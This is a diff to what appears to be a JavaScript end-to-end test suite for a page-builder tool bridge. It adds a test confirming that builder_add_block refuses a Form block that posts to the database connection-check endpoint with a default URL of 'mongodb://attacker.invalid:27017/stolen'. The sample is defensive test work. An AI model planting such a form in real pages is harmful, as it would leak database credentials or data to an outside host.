@@ -13,6 +13,7 @@ const PERMISSION_BITS = 0o777;
 const METHOD_NOT_FOUND = -32601;
 const INVALID_PARAMS = -32602;
 const USERS_PAGE = "/table-view/table-view-users";
+const CONNECT_CHECK = "/api/builder/database/connections/check";
 const USERS_PERMISSION = "library.components.table-view.table-view-users";
 const MOCKUP = "page-verify-member";
 /** A live route of the playground: a mockup block reading it draws a value of the backend, not a fixture. */
@@ -120,6 +121,40 @@ export const journeys = [
           ctx.holds("a block type is indexed", itemsOf(fieldOf(catalog, "blocks")).length > 0, text.slice(0, 200)),
           ctx.holds("a DataType is indexed", itemsOf(fieldOf(catalog, "dataTypes")).length > 0, text.slice(0, 200)),
           ctx.holds("reservedFieldNames is present", itemsOf(fieldOf(catalog, "reservedFieldNames")).length > 0, text.slice(0, 200)),
+        ]);
+      });
+    },
+  },
+  {
+    id: "builder-refuses-a-form-posting-to-the-connect-check",
+    title: "builder_add_block refuses a Form that submits to the assistant's database connect check, and the page holds no such block",
+    entryPoint: `node ${BRIDGE_LAUNCHER}, tools/call builder_add_block`,
+    async run(/** @type {Ctx} */ ctx) {
+      await withBridge(ctx, async (session) => {
+        const [page] = itemsOf(parseJson(toolText(await session.call("builder_list_pages")).text));
+        const pageRef = textOf(fieldOf(page, "ref"));
+        const added = toolText(
+          await session.call("builder_add_block", {
+            page: pageRef,
+            name: "reconnect",
+            type: "Form",
+            config: {
+              title: "Reconnect the database",
+              submitUrl: CONNECT_CHECK,
+              submitUrlMethod: "POST",
+              submitDefaults: { url: "mongodb://attacker.invalid:27017/stolen" },
+              fields: [{ id: "note", label: "Note", type: { $dataType: "string" } }],
+            },
+          }),
+        );
+        const issues = itemsOf(fieldOf(fieldOf(parseJson(added.text), "error"), "issues"));
+        await ctx.verify("the builder refuses the form, naming its submitUrl", [
+          ctx.equal("the tool reports a failure", added.isError, true),
+          ctx.equal("the refused option", issues.map((issue) => fieldOf(issue, "pointer")), ["/config/submitUrl"]),
+        ]);
+        const structure = toolText(await session.call("builder_page_structure", { pageRef }));
+        await ctx.verify("the page was not written", [
+          ctx.holds("the page holds no block posting to the connect check", !structure.text.includes(CONNECT_CHECK), structure.text.slice(0, 300)),
         ]);
       });
     },
